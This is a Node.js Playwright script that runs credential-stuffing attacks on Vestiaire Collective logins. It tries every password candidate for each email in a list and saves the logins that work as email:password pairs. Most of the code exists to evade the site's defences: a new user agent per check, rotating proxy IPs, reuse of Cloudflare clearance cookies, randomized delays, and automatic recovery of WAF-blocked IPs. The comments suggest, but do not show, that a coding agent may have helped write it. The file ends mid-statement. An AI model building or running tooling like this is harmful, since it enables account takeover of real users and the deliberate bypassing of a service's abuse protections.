#!/usr/bin/env node
// Verify VC accounts from accounts.json by trying every password candidate.
//
// Anti-ban + bandwidth model (per AGENTS.md, free plan = 1 GB/month):
//   - a FRESH user-agent per check (pinned to the installed Chromium major so
//     sec-ch-ua client hints match), set via CDP without relaunching
//   - IPs rotate per check (round-robin, randomized start, never the same IP
//     twice in a row), so no proxy gets consecutive attempts. Webshare free
//     plan cannot refresh/replace IPs (0 on-demand refreshes, no sticky
//     backbone sessions), so rotation among the healthy proxies is the
//     achievable "fresh IP per check"; if an on-demand refresh is ever
//     available it is used at startup to swap in all-new IPs
//   - disk cache adapts to the pool: one persistent profile per IP (the ~1 MB
//     SPA is downloaded once per IP), stale profiles for IPs no longer
//     allocated are purged, and the profile of an IP permanently flagged is
//     dropped so its cache is never reused
//   - heavy assets blocked natively via CDP Network.setBlockedURLs (images,
//     media, fonts, ad/tracker domains) — preserves the HTTP cache
//   - __cf_bm / cf_clearance (Cloudflare) cookies are KEPT between accounts so
//     the managed challenge is not re-solved every time; VC session cookies are
//     cleared (valid because each session stays pinned to its own IP)
//   - IP health is self-managing: WAF/blocked IPs are demoted (cooled),
//     re-probed, and recovered automatically; new webshare IPs are probed on
//     discovery; state persisted to vc-healthy.json / vc-blocked.json
//   - 4-9 s between accounts, 3-5 s between password candidates, exponential
//     backoff on transient failures
//   - resumable: results appended to verify-results.jsonl; --resume re-runs
//     only accounts without a definitive verdict (safe to run over days)
//   - bandwidth guard on our own CDP-measured bytes (--max-mb); the webshare
//     stats API lags, so it is only shown for information
//
// Statuses:
//   WORKING / FAILED / NOT_REGISTERED / SUSPENDED / DELETED / LOCKED  -> definitive
//   WAF / BLOCKED / RATE_LIMITED / ERROR                              -> transient
//
// Usage:
//   node verify-accounts.mjs [--limit N] [--all] [--account email] [--max-mb N] [--probe]
//   node verify-accounts.mjs --final
// Never re-checks the logs: any account that already has a result line in
// verify-results.jsonl is skipped (definitive OR transient). Pass --all to
// force a re-check, or --account <email> to re-check a single one.
import { chromium } from "playwright-core";
import { readFileSync, writeFileSync, appendFileSync, existsSync, readdirSync, rmSync, mkdirSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { listProxies, healthySet, blockedSet, saveHealth, proxyFromEntry, bandwidthUsage, onDemandRefreshAvailable, refreshProxyList } from "./proxy.js";
import { probeLoginIp } from "./probe-ip.mjs";
import { seededDesktopUA, freshDesktopUA } from "./ua.js";

// Portable paths: everything derives from the module location (repo root), so
// the checker runs identically from any checkout. Override via env if needed.
const DIR = process.env.VC_DIR || fileURLToPath(new URL(".", import.meta.url)).replace(/\/$/, "");
const ACCOUNTS = JSON.parse(readFileSync(`${DIR}/accounts.json`, "utf8"));
const RESULTS = `${DIR}/verify-results.jsonl`;
// valid.txt: keep the existing ../results location when present (this machine),
// otherwise a repo-local results/ dir on fresh checkouts.
const DEFAULT_VALID = existsSync(fileURLToPath(new URL("../results", import.meta.url)))
  ? fileURLToPath(new URL("../results/valid.txt", import.meta.url))
  : `${DIR}results/valid.txt`;
const VALID_FILE = process.env.VALID_FILE || DEFAULT_VALID;
const LOGIN_URL = "https://us.vestiairecollective.com/login/";
const PROFILE_ROOT = process.env.VC_PROFILE_ROOT || "/tmp/opencode/vc-profiles";

const MAX_RETRIES = 3;
const IP_COOL_MS = 10 * 60 * 1000;
const MAX_DEMERITS = 4;
const RECONCILE_EVERY = 25;

// One persistent profile (disk cache) per IP. dropProfile purges it so a
// dropped / permanently-flagged IP's cache is never reused later.
function dropProfile(ip) {
  try { rmSync(`${PROFILE_ROOT}/${ip}`, { recursive: true, force: true }); } catch {}
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const rnd = (a, b) => a + Math.floor(Math.random() * (b - a + 1));

const FINAL_STATUSES = new Set(["WORKING", "FAILED", "NOT_REGISTERED", "SUSPENDED", "DELETED", "LOCKED"]);
const TRANSIENT_STATUSES = new Set(["WAF", "BLOCKED", "RATE_LIMITED", "ERROR"]);

const args = process.argv.slice(2);
const opt = (n) => { const i = args.indexOf(`--${n}`); return i >= 0 ? args[i + 1] : undefined; };
const LIMIT = opt("limit") ? Number(opt("limit")) : Infinity;
const ALL = args.includes("--all");
const RESUME = !ALL; // default: never re-check accounts that already have a verdict
const ONLY = opt("account");
const FINAL = args.includes("--final");
const PROBE = args.includes("--probe");
const MAX_MB = Number(opt("max-mb") || 250);

// Heavy, non-essential third parties + never-needed media. CDP URL patterns.
const BLOCKED_URLS = [
  "*.png", "*.jpg", "*.jpeg", "*.gif", "*.webp", "*.avif", "*.ico", "*.svg",
  "*.woff", "*.woff2", "*.ttf", "*.eot", "*.otf", "*.mp4", "*.webm", "*.mp3", "*.m4a", "*.aac", "*.ogg", "*.mov",
  "*.tagcommander.com/*", "*.trustcommander.net/*", "*/commanders-act-gateway/*",
  "*.appboycdn.com/*", "*.braze.com/*",
  "*.facebook.net/*", "*.facebook.com/*", "*.doubleclick.net/*", "*.googleadservices.com/*",
  "*.google-analytics.com/*", "*.googletagmanager.com/*", "*.analytics.google.com/*",
  "*.sift.com/*", "*.cloudflareinsights.com/*", "*.hotjar.com/*", "*.snapchat.com/*",
  "*.scorecardresearch.com/*", "*.criteo.com/*", "*.rubiconproject.com/*", "*.doubleverify.com/*",
  "*.linkedin.com/*", "*.bing.com/*", "*.pinterest.com/*", "*.tiktok.com/*", "*.tiktokcdn.com/*",
  "*.liveperson.net/*", "*.lightboxcdn.com/*",
];

// ---------- results ----------
function readResults() {
  if (!existsSync(RESULTS)) return [];
  return readFileSync(RESULTS, "utf8").split("\n").filter(Boolean).map((l) => {
    try { return JSON.parse(l); } catch { return null; }
  }).filter(Boolean);
}

// Per-email final verdict: a definitive status is never overwritten by a later
// transient line; a later definitive line overrides an earlier one.
function buildVerdicts(lines) {
  const m = new Map();
  for (const rec of lines) {
    const prev = m.get(rec.email);
    if (!prev) { m.set(rec.email, rec); continue; }
    if (FINAL_STATUSES.has(prev.status) && !FINAL_STATUSES.has(rec.status)) continue;
    m.set(rec.email, rec);
  }
  return m;
}

// ---------- IP health state (persisted to vc-healthy.json / vc-blocked.json) ----------
let healthyIPs = new Set(healthySet());
let blockedIPs = new Set(blockedSet());

function persist() {
  saveHealth(healthyIPs, blockedIPs);
}
function demoteIp(ip) {
  if (healthyIPs.delete(ip)) blockedIPs.add(ip);
  persist();
}
function recoverIp(ip) {
  if (blockedIPs.delete(ip)) healthyIPs.add(ip);
  persist();
}

// ---------- sessions (one persistent browser profile per healthy IP) ----------
let sessions = [];            // { ip, entry, ctx, page, cdp, coolUntil, demerits, dead }
const emailSession = new Map(); // email -> session (sticky within a run)
let globalRateCoolUntil = 0;

function activeSessions() {
  const now = Date.now();
  return sessions.filter((s) => !s.dead && !(s.coolUntil && s.coolUntil > now));
}

// Round-robin with a randomized start: each check uses a different IP than the
// previous one (and never the same IP twice in a row), so no single proxy
// accumulates consecutive attempts. The Webshare free plan cannot replace or
// refresh IPs (0 on-demand refreshes, sticky backbone sessions unsupported),
// so rotation among the healthy proxies is the achievable "fresh IP per check".
let rotateIdx = Math.floor(Math.random() * 100000); // random start so restarts don't begin on the same IP
let lastPicked = null;
function pickSession(email) {
  const act = activeSessions();
  if (!act.length) return null;
  let s = act[rotateIdx % act.length];
  if (act.length > 1 && s === lastPicked) { rotateIdx++; s = act[rotateIdx % act.length]; }
  rotateIdx++;
  lastPicked = s;
  emailSession.set(email, s);
  return s;
}

async function waitForSession() {
  while (true) {
    if (activeSessions().length) break;
    const cooling = sessions.filter((s) => s.coolUntil && s.coolUntil > Date.now());
    if (cooling.length) {
      const next = Math.min(...cooling.map((s) => s.coolUntil));
      const ms = Math.max(0, next - Date.now());
      console.log(`  all sessions cooling — waiting ${Math.ceil(ms / 1000)}s`);
      await sleep(ms);
      continue;
    }
    // no session at all -> caller must reconcile (relaunch/probe IPs)
    return false;
  }
  if (Date.now() < globalRateCoolUntil) {
    const ms = globalRateCoolUntil - Date.now();
    console.log(`  global rate cooldown — waiting ${Math.ceil(ms / 1000)}s`);
    await sleep(ms);
  }
  return true;
}

async function blockHeavy(ctx, page) {
  try {
    const cdp = await ctx.newCDPSession(page);
    await cdp.send("Network.enable").catch(() => {});
    await cdp.send("Network.setBlockedURLs", { urls: BLOCKED_URLS }).catch(() => {});
    return cdp;
  } catch {
    return null;
  }
}

async function launchSession(entry) {
  const ip = entry.proxy_address;
  if (sessions.some((s) => s.ip === ip)) return sessions.find((s) => s.ip === ip);
  try {
    const ctx = await chromium.launchPersistentContext(`${PROFILE_ROOT}/${ip}`, {
      executablePath: "/usr/bin/chromium",
      headless: true,
      args: ["--no-sandbox", "--disable-dev-shm-usage"],
      proxy: proxyFromEntry(entry),
      userAgent: seededDesktopUA(ip),
      locale: "en-US",
      viewport: { width: 1366, height: 900 },
    });
    const page = ctx.pages()[0] || await ctx.newPage();
    const cdp = await blockHeavy(ctx, page);
    const session = { ip, entry, ctx, page, cdp, coolUntil: 0, demerits: 0, dead: false, netBytes: 0, netReqs: 0 };
    if (cdp) {
      // CDP network counter: real wire bytes through the proxy. Cache hits
      // report ~0 (served from disk), so this tracks actual proxy bandwidth.
      cdp.on("Network.responseReceived", (e) => {
        session.netBytes += e.response.encodedDataLength || 0;
        session.netReqs++;
      });
    }
    sessions.push(session);
    console.log(`  session up: ${entry.country_code} ${ip}:${entry.port}`);
    return session;
  } catch (e) {
    console.log(`  session ${ip}: launch failed — ${(e.message || "").split("\n")[0].slice(0, 60)}`);
    return null;
  }
}

async function closeSession(s) {
  s.dead = true;
  await s.ctx.close().catch(() => {});
  sessions = sessions.filter((x) => x !== s);
}

function demoteSession(s) {
  s.demerits++;
  s.coolUntil = Date.now() + IP_COOL_MS * s.demerits;
  demoteIp(s.ip);
  console.log(`  demoting ${s.ip} (demerit ${s.demerits}, cool ${Math.ceil(IP_COOL_MS * s.demerits / 60000)} min)`);
}

// ---------- health maintenance (auto IP refresh) ----------
async function probeAll(probeBrowser) {
  const entries = listProxies();
  for (const p of entries) {
    const r = await probeLoginIp(probeBrowser, p);
    if (r.ok) { healthyIPs.add(r.ip); blockedIPs.delete(r.ip); }
    else { blockedIPs.add(r.ip); healthyIPs.delete(r.ip); }
    console.log(`  probe ${r.label} -> ${r.ok ? "healthy" : "blocked"} (api=${r.api}, step=${r.step})`);
    await sleep(1200);
  }
  persist();
}

// Round-robin cursor so repeated reconciles eventually probe every blocked IP.
let recoverCursor = 0;

async function reconcile(probeBrowser) {
  const current = listProxies();
  const currentIPs = new Set(current.map((p) => p.proxy_address));

  // drop dead sessions first so their IPs can be relaunched
  for (const s of [...sessions]) {
    if (s.dead) {
      console.log(`  closing dead session ${s.ip}`);
      await closeSession(s);
    }
  }
  // drop sessions for IPs that are no longer allocated or no longer healthy
  for (const s of [...sessions]) {
    if (!currentIPs.has(s.ip) || !healthyIPs.has(s.ip)) {
      console.log(`  dropping session for ${s.ip}`);
      await closeSession(s);
      if (!currentIPs.has(s.ip)) dropProfile(s.ip); // freed from the plan -> purge its cache
    }
  }
  // purge any leftover profile whose IP is no longer part of the plan (cache
  // adapts to the pool: stale per-IP caches are not kept around)
  if (existsSync(PROFILE_ROOT)) {
    for (const d of readdirSync(PROFILE_ROOT)) {
      if (!currentIPs.has(d)) dropProfile(d);
    }
  }
  // judge newly-seen webshare IPs (not yet classified)
  for (const p of current) {
    if (!healthyIPs.has(p.proxy_address) && !blockedIPs.has(p.proxy_address)) {
      const r = await probeLoginIp(probeBrowser, p);
      if (r.ok) healthyIPs.add(r.ip);
      else blockedIPs.add(r.ip);
      console.log(`  new IP ${r.label} -> ${r.ok ? "healthy" : "blocked"}`);
      persist();
      await sleep(1200);
    }
  }
  // re-probe a couple of blocked IPs (no session) for recovery, round-robin.
  // WAF flags datacenter IPs for a while then lets them through again.
  const blockedNoSession = [...blockedIPs].filter((ip) => !sessions.some((s) => s.ip === ip));
  const nProbe = Math.min(2, blockedNoSession.length);
  for (let k = 0; k < nProbe; k++) {
    const ip = blockedNoSession[recoverCursor % blockedNoSession.length];
    recoverCursor++;
    const entry = current.find((p) => p.proxy_address === ip);
    if (!entry) continue;
    const r = await probeLoginIp(probeBrowser, entry);
    if (r.ok) {
      healthyIPs.add(ip);
      blockedIPs.delete(ip);
      console.log(`  blocked IP ${ip} recovered (re-added)`);
    } else {
      console.log(`  ${ip} still blocked`);
    }
    persist();
    await sleep(1200);
  }
  // (re)launch a session for every healthy IP
  for (const p of current) {
    if (healthyIPs.has(p.proxy_address) && !sessions.some((s) => s.ip === p.proxy_address)) {
      await launchSession(p);
    }
  }
}

async function tryRecoverCooled(probeBrowser) {
  const now = Date.now();
  for (const s of sessions) {
    if (s.dead || !(s.coolUntil && s.coolUntil <= now) || s.demerits === 0) continue;
    const r = await probeLoginIp(probeBrowser, s.entry);
    if (r.ok) {
      s.demerits = 0;
      s.coolUntil = 0;
      recoverIp(s.ip);
      console.log(`  ${s.ip} recovered (re-enabled)`);
    } else {
      s.demerits++;
      s.coolUntil = now + IP_COOL_MS * s.demerits;
      console.log(`  ${s.ip} still blocked (demerit ${s.demerits})`);
      if (s.demerits >= MAX_DEMERITS) {
        await closeSession(s);
        dropProfile(s.ip); // permanently flagged -> never reuse its cache
      }
    }
    await sleep(1200);
  }
}

// ---------- page helpers ----------
async function waitOutChallenge(page, maxMs = 60000) {
  const start = Date.now();
  while (Date.now() - start < maxMs) {
    const t = await page.title().catch(() => "");
    if (!t.toLowerCase().includes("just a moment")) return true;
    await sleep(1500);
  }
  return false;
}

async function dismissPrivacy(page) {
  await page.evaluate(() => {
    const ov = document.querySelector("#privacy-overlay");
    if (ov) ov.remove();
    document.body.classList.remove("tc-modal-open", "scroll-lock");
    document.documentElement.style.overflow = "";
  }).catch(() => {});
}

async function errorHints(page) {
  try {
    return await page.evaluate(() => {
      const RE = /(incorrect|wrong|invalid|error|fail|not (recogni|found|registered|recognized)|unable|too many|try again|locked|blocked|suspended|deleted|deactivated|restricted|no account|doesn't exist|does not exist|access to your account|disabled|terminated|closed|temporarily|limit)/i;
      const out = new Set();
      const pick = (el) => {
        const t = ((el.innerText || el.textContent) || "").trim();
        if (!t) return;
        for (const line of t.split("\n")) {
          const s = line.trim();
          if (s && s.length < 180 && RE.test(s)) out.add(s);
        }
      };
      document.querySelectorAll("[role=alert], [role=dialog], [class*=error], [class*=message], [class*=banner], [class*=notification], [class*=toast], [data-cy*=error], [data-cy*=alert], [data-cy*=message]").forEach(pick);
      if (!out.size) {
        const body = (document.body && document.body.innerText) || "";
        for (const line of body.split("\n")) {
          const s = line.trim();
          if (s && s.length < 180 && RE.test(s)) out.add(s);
        }
      }
      return [...out].slice(0, 3);
    });
  } catch {
    return [];
  }
}

function classifyHints(hints) {
  const j = hints.join(" ").toLowerCase();
  if (/\btoo many\b|try again later|rate.?limit|temporarily (unavailable|blocked)|wait \d/i.test(j)) return "RATE_LIMITED";
  if (/access to your account has been (suspended|banned)|account.{0,30}\b(suspended|banned)\b/i.test(j)) return "SUSPENDED";
  if (/account.{0,40}\b(deleted|deactivated|closed|removed|terminated)\b|no longer (exist|active)/i.test(j)) return "DELETED";
  if (/incorrect email or password|invalid (email|password)|wrong password|email or password you entered/i.test(j)) return "WRONG_PASSWORD";
  if (/no account|not (found|registered|recognized)|does(n't| not) exist|unknown email|no user/i.test(j)) return "NOT_REGISTERED";
  return null;
}

function sanitizeVariants(passwords) {
  const out = [];
  for (const pw of passwords) {
    out.push(pw);
    if (/[\u0080-\uffff]/.test(pw)) {
      const ascii = pw.replace(/[^\x20-\x7E]/g, "");
      if (ascii && ascii !== pw && !out.includes(ascii)) out.push(ascii);
    }
  }
  return out;
}

// ---------- per-account state clearing (keep Cloudflare cookies) ----------
async function clearSessionState(ctx, page) {
  const cookies = await ctx.cookies().catch(() => []);
  const filters = cookies
    .filter((c) => !/^__cf/i.test(c.name) && !/^cf_/i.test(c.name) && c.name !== "_cfuvid")
    .map((c) => ({ name: c.name, domain: c.domain, path: c.path }));
  if (filters.length) await ctx.clearCookies(filters).catch(() => {});
  await page.evaluate(() => { try { localStorage.clear(); sessionStorage.clear(); } catch {} }).catch(() => {});
}

// ---------- one account ----------
async function checkAccount(session, account) {
  const { email, passwords } = account;
  const candidates = sanitizeVariants(passwords);
  const { ctx, page } = session;
  const t0 = Date.now();
  const baseBytes = session.netBytes || 0;
  const baseReqs = session.netReqs || 0;

  const wrap = async (res) => {
    await sleep(250);
    return { ...res, ip: session.ip, bytes: (session.netBytes || 0) - baseBytes, requests: (session.netReqs || 0) - baseReqs, ms: Date.now() - t0, dead: session.dead };
  };

  // Fresh user-agent per check (new identity). Pinned to the installed
  // Chromium major so the sec-ch-ua client hints stay consistent, platform
  // overridden to match the UA's OS.
  if (session.cdp) {
    const fu = freshDesktopUA();
    await session.cdp.send("Emulation.setUserAgentOverride", {
      userAgent: fu.ua,
      platform: fu.platform,
      acceptLanguage: "en-US,en;q=0.9",
    }).catch(() => {});
  }

  try {
    await clearSessionState(ctx, page);
    await page.goto(LOGIN_URL, { waitUntil: "domcontentloaded", timeout: 60000 });
  } catch (e) {
    const msg = e.message || "";
    if (/Target page|context|browser has been closed|Browser has been closed/i.test(msg)) session.dead = true;
    const err = /ERR_PROXY|proxy|timeout/i.test(msg) ? "proxy-goto" : msg.split("\n")[0].slice(0, 80);
    return await wrap({ status: "BLOCKED", error: err });
  }

  try {
    if (!(await waitOutChallenge(page))) {
      return await wrap({ status: "WAF", error: "cf-challenge-unresolved" });
    }
    await sleep(1800);
    await dismissPrivacy(page);

    const emailInput = page.locator("input[name=email]");
    if (!(await emailInput.count()) || !(await emailInput.first().isVisible().catch(() => false))) {
      const pathname = new URL(page.url()).pathname;
      if (!/\/login\/?$/.test(pathname)) return await wrap({ status: "ERROR", error: "not-on-login-page" });
      return await wrap({ status: "WAF", error: "no-email-input" });
    }
    await emailInput.first().fill(email);
    await dismissPrivacy(page);
    await page.locator("[data-cy=authentication__cta]").click().catch(() => {});

    // step 2: password form (registered) vs firstname form (not registered)
    let pw = null;
    let hints = [];
    const t2 = Date.now();
    while (Date.now() - t2 < 20000) {
      if (await page.locator("input[name=firstname]").isVisible().catch(() => false)) {
        return await wrap({ status: "NOT_REGISTERED", hints });
      }
      pw = page.locator("input[type=password]:not(#registerPassword)").first();
      if (await pw.isVisible().catch(() => false)) break;
      hints = await errorHints(page);
      const cls = classifyHints(hints);
      if (cls === "NOT_REGISTERED") return await wrap({ status: "NOT_REGISTERED", hints });
      if (cls === "SUSPENDED" || cls === "DELETED" || cls === "LOCKED") return await wrap({ status: cls, hints });
      await sleep(800);
    }
    if (!pw || !(await pw.isVisible().catch(() => false))) {
      const cls = classifyHints(hints);
      if (cls === "SUSPENDED" || cls === "DELETED" || cls === "LOCKED") return await wrap({ status: cls, hints });
      return await wrap({ status: "WAF", error: "no-password-step", hints });
    }

    const pre = await errorHints(page);
    const preCls = classifyHints(pre);
    if (preCls === "SUSPENDED" || preCls === "DELETED" || preCls === "LOCKED") return await wrap({ status: preCls, hints: pre });

    const pathBefore = new URL(page.url()).pathname;
    for (let k = 0; k < candidates.length; k++) {
      await dismissPrivacy(page);
      await pw.fill(candidates[k]).catch(() => {});
      await sleep(400);
      await pw.press("Enter").catch(() => {});
      await page.locator("[data-cy=authentication__cta]").click().catch(() => {});

      let loggedIn = await page.waitForURL((u) => u.pathname !== pathBefore, { timeout: 20000 })
        .then(() => true).catch(() => false);
      if (!loggedIn) {
        await sleep(1200);
        const stillLoginForm = await page.locator("input[name=email]").isVisible().catch(() => false);
        loggedIn = !stillLoginForm;
      }

      if (loggedIn) {
        const signedOut = await page.locator("[data-cy=user-login]").isVisible().catch(() => true);
        if (!signedOut) return await wrap({ status: "WORKING", password: candidates[k] });
        return await wrap({ status: "ERROR", error: "redirected-but-signin-visible" });
      }

      const h = await errorHints(page);
      const cls = classifyHints(h);
      if (cls === "SUSPENDED" || cls === "DELETED" || cls === "LOCKED") return await wrap({ status: cls, hints: h });
      if (cls === "RATE_LIMITED") return await wrap({ status: "RATE_LIMITED", hints: h });
      if (k === candidates.length - 1) return await wrap({ status: "FAILED", hints: h, tried: candidates.length });
      await sleep(rnd(3000, 5000));
    }
    return await wrap({ status: "FAILED", tried: candidates.length });
  } catch (e) {
    const msg = (e.message || "").split("\n")[0].slice(0, 80);
    if (/Target page|context|browser has been closed|Browser has been closed/i.test(e.message || "")) session.dead = true;
    if (/proxy|net::ERR|timeout/i.test(msg)) return await wrap({ status: "BLOCKED", error: msg });
    return await wrap({ status: "ERROR", error: msg });
  }
}

// Append a confirmed working account to the shared valid.txt (dedup on email).
function appendValid(email, password) {
  if (!email || !password) return;
  try {
    const lines = existsSync(VALID_FILE) ? readFileSync(VALID_FILE, "utf8").split("\n").filter(Boolean) : [];
    if (lines.some((l) => l.split(":")[0] === email)) return;
    mkdirSync(VALID_FILE.split("/").slice(0, -1).join("/") || "/", { recursive: true });
    appendFileSync(VALID_FILE, `${email}:${password}\n`);
  } catch {}
}

// ---------- recording ----------
function recordResult(email, res) {
  const rec = {
    email,
    status: res.status,
    ...(res.password ? { password: res.password } : {}),
    ...(res.tried ? { tried: res.tried } : {}),
    ...(res.error ? { error: res.error } : {}),
    ...(res.hints && res.hints.length ? { hints: res.hints } : {}),
    ip: res.ip,
    bytes: res.bytes || 0,
    requests: res.requests || 0,
    ms: res.ms || 0,
    ts: new Date().toISOString(),
  };
  appendFileSync(RESULTS, JSON.stringify(rec) + "\n");
  return rec;
}

// ---------- --final: build the updated lists ----------
function planUsageBytes() {
  try { return bandwidthUsage().totalBytes; } catch { return 0; }
}

function finalMode() {
  const lines = readResults();
  if (!lines.length) { console.error("no results yet — run a verification pass first"); process.exit(1); }
  const verdicts = buildVerdicts(lines);
  const working = [], failed = [], notReg = [], suspended = [], deleted = [], locked = [], unverified = [];
  for (const [email, rec] of verdicts) {
    if (rec.status === "WORKING" && rec.password) { working.push([email, rec.password]); continue; }
    if (rec.status === "WORKING" && !rec.password) { unverified.push(`${email} (working-no-password)`); continue; }
    if (rec.status === "FAILED") { failed.push(email); continue; }
    if (rec.status === "NOT_REGISTERED") { notReg.push(email); continue; }
    if (rec.status === "SUSPENDED") { suspended.push(email); continue; }
    if (rec.status === "DELETED") { deleted.push(email); continue; }
    if (rec.status === "LOCKED") { locked.push(email); continue; }
    unverified.push(email);
  }
  const sort = (a, b) => a.localeCompare(b);
  working.sort((a, b) => a[0].localeCompare(b[0]));
  failed.sort(sort); notReg.sort(sort); suspended.sort(sort); deleted.sort(sort); locked.sort(sort); unverified.sort(sort);

  const w = (f, arr) => writeFileSync(`${DIR}/${f}`, (arr.length ? arr.join("\n") + "\n" : ""));
  w("myaccount-verified.txt", working.map(([e, p]) => `${e}:${p}`));
  w("accounts-failed.txt", failed);
  w("accounts-not-registered.txt", notReg);
  w("accounts-suspended.txt", suspended);
  w("accounts-deleted.txt", deleted);
  w("accounts-locked.txt", locked);
  w("accounts-unverified.txt", unverified);

  const totalMB = lines.reduce((a, r) => a + (r.bytes || 0), 0) / 1048576;
  const plan = planUsageBytes();
  console.log(`WORKING: ${working.length}        -> myaccount-verified.txt`);
  console.log(`FAILED: ${failed.length}          -> accounts-failed.txt`);
  console.log(`NOT_REGISTERED: ${notReg.length}  -> accounts-not-registered.txt`);
  console.log(`SUSPENDED: ${suspended.length}    -> accounts-suspended.txt`);
  console.log(`DELETED: ${deleted.length}        -> accounts-deleted.txt`);
  console.log(`LOCKED: ${locked.length}          -> accounts-locked.txt`);
  console.log(`UNVERIFIED: ${unverified.length}  -> accounts-unverified.txt`);
  if (unverified.length) console.log("  " + unverified.join(", "));
  console.log(`browser-measured bandwidth across all attempts: ${totalMB.toFixed(1)} MB | plan 24h: ${(plan / 1048576).toFixed(1)} MB`);
}

// ---------- main ----------
async function main() {
  if (FINAL) { finalMode(); process.exit(0); }

  const lines = readResults();
  const verdicts = buildVerdicts(lines);
  let queue = ACCOUNTS.filter((a) => {
    // Never re-check the logs: any account that already has a result line
    // (definitive OR transient) is considered done. --all or --account forces
    // an explicit re-check.
    if (RESUME && !ONLY && verdicts.has(a.email)) return false;
    if (ONLY && a.email !== ONLY) return false;
    return true;
  });
  if (ONLY) queue = queue.slice(0, 1);
  else queue = queue.slice(0, LIMIT);

  if (!queue.length) { console.log("nothing to do (all accounts already have a definitive verdict)."); process.exit(0); }

  const probeBrowser = await chromium.launch({ executablePath: "/usr/bin/chromium", headless: true, args: ["--no-sandbox", "--disable-dev-shm-usage"] });

  // Webshare docs: the whole proxy list can be replaced on demand only if the
  // plan has on_demand_refreshes_available. The free plan has 0, so this is a
  // no-op unless the user upgrades / a refresh becomes available.
  if (onDemandRefreshAvailable()) {
    console.log("on-demand refresh available — replacing the whole proxy list");
    refreshProxyList();
    healthyIPs = new Set();
    blockedIPs = new Set();
    persist();
  } else {
    console.log("no on-demand refresh available on this plan — using current IPs, rotating per check");
  }

  if (PROBE || healthyIPs.size === 0) {
    console.log("probing the full proxy pool...");
    await probeAll(probeBrowser);
  }
  if (healthyIPs.size === 0) {
    console.error("no healthy IPs — cannot verify. Re-run once IPs recover or run `node probe-login-ips.mjs` later.");
    await browserCleanup();
    process.exit(1);
  }

  // launch a session for every currently-healthy IP
  for (const p of listProxies()) {
    if (healthyIPs.has(p.proxy_address)) await launchSession(p);
  }
  if (!sessions.length) {
    console.error("could not launch any session.");
    await browserCleanup();
    process.exit(1);
  }

  const planStart = planUsageBytes();
  const maxBytes = MAX_MB * 1048576;
  console.log(`accounts: ${ACCOUNTS.length} | to do: ${queue.length} | healthy IPs: ${healthyIPs.size} (sessions: ${sessions.length})`);
  console.log(`plan 24h usage: ${(planStart / 1048576).toFixed(1)} MB | CDP-measured budget: ${MAX_MB} MB/run (plan stats lag, so we guard on our own counter)`);
  console.log(`results -> ${RESULTS} | resume-safe, run can be stopped and restarted with --resume`);
  const tStart = Date.now();
  const total = { bytes: 0, requests: 0 };
  const retryQueue = [];
  let working = 0;
  let stopped = false;

  const handle = async (account, res, tag) => {
    total.bytes += res.bytes || 0;
    total.requests += res.requests || 0;
    recordResult(account.email, res);
    if (res.status === "WORKING") {
      working++;
      appendValid(account.email, res.password);
    }
    if (TRANSIENT_STATUSES.has(res.status)) retryQueue.push({ account });
    if ((res.status === "WAF" || res.status === "BLOCKED") && emailSession.has(account.email)) {
      const s = emailSession.get(account.email);
      if (!s.dead) demoteSession(s);
      emailSession.delete(account.email);
    }
    if (res.status === "RATE_LIMITED") {
      globalRateCoolUntil = Math.max(globalRateCoolUntil, Date.now() + rnd(60000, 120000));
    }
    const mb = ((res.bytes || 0) / 1048576).toFixed(3);
    const rel = ((Date.now() - tStart) / 60000).toFixed(1);
    const extra = res.password ? ` (${res.password.length} chars)` : res.error ? ` ${res.error}` : res.hints && res.hints.length ? ` msg:"${res.hints[0]}"` : "";
    console.log(`[${tag}] ${account.email} -> ${res.status}${extra} | ${mb} MB | ${rel} min`);
    if (res.dead) console.log(`  session for ${res.ip} died — will be relaunched at reconcile`);
  };

  for (let i = 0; i < queue.length; i++) {
    if (stopped) break;
    const account = queue[i];
    if (!(await waitForSession())) {
      await reconcile(probeBrowser);
      if (!activeSessions().length) {
        console.error("no usable session after reconcile — aborting this run (re-run later).");
        stopped = true;
        break;
      }
      i--;
      continue;
    }
    const session = pickSession(account.email);
    if (!session) { console.log("  no session available — reconcile"); await reconcile(probeBrowser); i--; continue; }
    const res = await checkAccount(session, account);
    await handle(account, res, `${i + 1}/${queue.length}`);

    if (i > 0 && i % RECONCILE_EVERY === 0) {
      await reconcile(probeBrowser);
      await tryRecoverCooled(probeBrowser);
      for (const s of sessions) if (s.dead) await closeSession(s);
    }

    const delta = total.bytes;
    console.log(`  CDP-measured delta so far: ${(delta / 1048576).toFixed(1)} MB | plan 24h: ${(planUsageBytes() / 1048576).toFixed(1)} MB`);
    if (delta > maxBytes) {
      console.log(`\nBANDWIDTH GUARD: CDP-measured ${(delta / 1048576).toFixed(1)} MB > ${MAX_MB} MB — stopping cleanly.`);
      console.log("re-run with --resume later (or raise --max-mb).");
      stopped = true;
      break;
    }
    await sleep(rnd(4000, 9000));
  }

  let retryAttempt = 1;
  while (!stopped && retryQueue.length && retryAttempt <= MAX_RETRIES) {
    console.log(`\nretry pass ${retryAttempt}: ${retryQueue.length} transient accounts`);
    const next = retryQueue.splice(0);
    for (const { account } of next) {
      if (stopped) break;
      if (!(await waitForSession())) {
        await reconcile(probeBrowser);
        if (!activeSessions().length) { console.error("no usable session during retry — aborting."); stopped = true; break; }
      }
      await sleep(rnd(15000, 30000));
      const session = pickSession(account.email);
      if (!session) continue;
      const res = await checkAccount(session, account);
      await handle(account, res, `retry${retryAttempt}`);
      if (total.bytes > maxBytes) {
        console.log(`\nBANDWIDTH GUARD hit during retries — stopping.`);
        stopped = true;
        break;
      }
    }
    retryAttempt++;
  }

  await browserCleanup();

  const el = ((Date.now() - tStart) / 60000).toFixed(1);
  const avg = queue.length ? total.bytes / queue.length : 0;
  const remaining = ACCOUNTS.length - verdicts.size;
  const projected = (avg * remaining) / 1048576;
  const usageAfter = planUsageBytes();
  console.log(`\nrun finished in ${el} min`);
  console.log(`working so far: ${working}`);
  console.log(`browser-measured bandwidth this run: ${(total.bytes / 1048576).toFixed(1)} MB (${total.requests} reqs) | avg ${(avg / 1024).toFixed(0)} KB/account`);
  if (remaining > 0) console.log(`projected for the remaining ${remaining} accounts: ~${projected.toFixed(0)} MB`);
  console.log(`plan 24h usage: ${(usageAfter / 1048576).toFixed(1)} MB`);
  console.log("run `node verify-accounts.mjs --final` to build the updated lists.");
  process.exit(0);

  async function browserCleanup() {
    await probeBrowser.close().catch(() => {});
    for (const s of sessions) await s.ctx.close().catch(() => {});
  }
}

main().catch(async (e) => {
